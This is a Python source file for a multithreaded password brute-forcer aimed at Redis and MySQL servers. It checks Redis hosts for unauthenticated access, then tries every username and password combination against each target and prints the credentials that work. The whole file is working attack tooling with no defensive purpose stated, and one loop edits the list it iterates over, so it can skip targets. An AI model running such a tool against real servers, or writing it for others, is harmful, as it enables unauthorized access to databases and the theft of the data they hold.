from threading import Thread, BoundedSemaphore
from pymysql import connect
from socket import socket


class Brute(object):
    def __init__(self, **kwargs):
        self.targets = kwargs.get('targets', [])
        self.threads = kwargs.get('threads', 20)
        self.users = kwargs.get('users', [''])
        self.passwords = kwargs.get('passwords', [''])
        self.results = []

        self.lock = BoundedSemaphore(self.threads)

    def run(self):
        th_pool = []
        for target in self.targets:
            for user in self.users:
                for passwd in self.passwords:
                    th = Thread(target=self._brute, args=(target, user, passwd))
                    th.start()
                    th_pool.append(th)
        for th in th_pool:
            th.join()

    def print(self):
        for i in self.results:
            for key, value in i.items():
                print('[+]{}: {}'.format(key, value))
            print()

    def _brute(self, target, user, passwd):
        pass


class RedisBrute(Brute):
    def __init__(self, **kwargs):
        super(RedisBrute, self).__init__(**kwargs)

        self.port = kwargs.get('port', 6379)
        self._check()

    # 先检测下未授权
    def _check(self):
        for target in self.targets:
            if self.check_auth(target, self.port):
                self.targets.remove(target)
                self.results.append({'target': '{}:{}'.format(target, self.port), 'result': 'unauthorized'})

    def _brute(self, target, user, passwd):
        self.lock.acquire()
        s = socket()
        try:
            s.settimeout(2)
            s.connect((target, self.port))
            s.send('AUTH {}\r\n'.format(passwd).encode('utf-8'))
            if b'+OK' in s.recv(1024):
                self.results.append({'target': '{}:{}'.format(target, self.port), 'result': passwd})
        except Exception:
            pass
        finally:
            s.close()
        self.lock.release()

    @staticmethod
    def check_auth(target, port):
        s = socket()
        try:
            s.settimeout(2)
            s.connect((target, int(port)))
            s.send(b'info\r\n')
            if b'redis_version:' in s.recv(128):
                return True
        except Exception:
            return False
        finally:
            s.close()


class MysqlBrute(Brute):
    def __init__(self, **kwargs):
        super(MysqlBrute, self).__init__(**kwargs)

        self.port = kwargs.get('port', 3306)

    def _brute(self, target, user, passwd):
        self.lock.acquire()
        try:
            connect(host=target, port=self.port, user=user, password=passwd)
            self.results.append({'target': '{}:{}'.format(target, self.port), 'result': '{}:{}'.format(user, passwd)})
        except Exception:
            pass
        self.lock.release()
